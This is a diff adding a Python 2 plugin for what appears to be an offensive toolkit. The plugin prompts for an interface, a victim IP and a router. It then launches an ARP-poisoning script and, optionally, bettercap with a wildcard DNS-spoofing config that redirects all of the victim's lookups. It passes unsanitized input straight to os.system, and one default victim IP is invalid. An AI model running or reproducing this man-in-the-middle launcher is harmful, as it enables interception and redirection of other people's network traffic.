@@ -1,0 +1,123 @@
+#!/usr/bin/python
+# -*- coding: utf-8 -*-
+import os
+import sys
+import time
+from terminaltables import DoubleTable
+import logging
+
+intname = "rsf "
+det = sys.argv[0]
+fin = det.split('.')[-2]
+__plugin__      = "%s.plugin" % (fin)
+RescoursesDir = os.getcwd()
+dandtime = time.strftime("%H:%M:%S")
+logfile = "%s/storage/logs/%s.log" % (RescoursesDir,dandtime)
+
+class Tee(object):
+  def __init__(self):
+    self.file = open(logfile, 'a')
+    self.stdout = sys.stdout
+
+  def __del__(self):
+    sys.stdout = self.stdout
+    self.file.close()
+
+  def write(self, data):
+    self.file.write(data)
+    self.stdout.write(data)
+
+sys.stdout = Tee()
+def dash():
+    while True:
+        line_1 = "" + intname + "(\033[1;31m" + fin + "\033[1;m) > "
+        terminal = raw_input(line_1).lower()
+        time.sleep(0.5)
+        if terminal == 'help':
+            print "\n"
+            print "Core Commands"
+            print "============="
+            print ""
+            print "  Command         Description"
+            print "  -------         -----------"
+            print "  help            show help menu"
+            print "  execute         run the plugin"
+            print "  exit            exit the current plugin"
+            print ""
+        elif terminal == 'execute':
+            poppy()
+        elif terminal == 'exit':
+            exit()
+        else:
+            print "Unknown syntax: %s" % (terminal)
+
+def poppy():
+    gate = "192.168.1.1"
+    yen = "yes"
+    inter = "wlan0"
+    vic = "192.326.1.25"
+
+    print "\033[1;94m[?]\033[1;m Interface :: Your interface"
+    interface = raw_input('\033[1;92m[+]\033[1;m interface: [' + inter + ']: ') or inter
+
+    print "\033[1;94m[?]\033[1;m Target :: Enter the targets ip"
+    target = raw_input('\033[1;92m[+]\033[1;m target: [' + vic + ']: ') or vic
+
+    print "\033[1;94m[?]\033[1;m Gateway :: Enter the gateway/router ip"
+    gateway = raw_input('\033[1;92m[+]\033[1;m router: [' + gate + ']: ') or gate
+
+    YUN = "0"
+    print "\033[1;94m[?]\033[1;m Function :: Would you like to setup dns spoofing?"
+    print ""
+    print "*0) no :: Disable dns spoofing"
+    print " 1) yes :: Enable dns spoofing"
+    print ""
+    function = raw_input('\033[1;92m[+]\033[1;m function: [' + YUN + ']: ') or YUN
+    if function == '0':
+            print "\033[1;94m[?]\033[1;m Configuring Plugin"
+            time.sleep(1)
+            print ""
+            print "Name             Set Value"
+            print "----             ----------"
+            print "Interface        %s" % (interface)
+            print "Target           %s" % (target)
+            print "Router           %s" % (gateway)
+            print "Plugin           %s" % (fin)
+            print "\n"
+            et = raw_input("\033[1;94m[?]\033[1;m Execute Plugins? [" + yen + "]: ")  or yen
+            if et == 'yes':
+                os.system('python plugins/poppy.py ' + interface + ' ' + target + ' ' + gateway + '')
+            elif et == 'no':
+                print "Goodbye ;("
+                sys.exit()
+            else:
+                print "\033[1;92m[!] No options were chosen.\033[1;m"
+    elif function == '1':
+            den = "8.8.8.8"
+            print "\033[1;94m[?]\033[1;m DNS :: Enter a dns to redirect all traffic to the host"
+            dns = raw_input('\033[1;92m[+]\033[1;m dns: [' + den + ']: ') or den
+            print "\033[1;94m[?]\033[1;m Configuring Plugin"
+            time.sleep(1)
+            print ""
+            print "Name             Set Value"
+            print "----             ----------"
+            print "Interface        %s" % (interface)
+            print "Target           %s" % (target)
+            print "Router           %s" % (gateway)
+            print "DNS              %s" % (dns)
+            print "Plugin           %s" % (fin)
+            print "\n"
+            et = raw_input("\033[1;94m[?]\033[1;m Execute Plugins? [" + yen + "]: ")  or yen
+            if et == 'yes':
+                dns_config = open("storage/logs/dns.conf","w")
+                dns_config.write("%s .*\.*" % (dns))
+                dns_config.close()
+                os.system('python plugins/poppy.py ' + interface + ' ' + target + ' ' + gateway + ' &')
+                os.system("bettercap --target " + target + " --dns storage/logs/dns.conf --custom-parser DNS -I " + interface + " --gateway " + gateway + "")
+            elif et == 'no':
+                print "Goodbye ;("
+                sys.exit()
+            else:
+                print "choose an option!"
+
+dash()
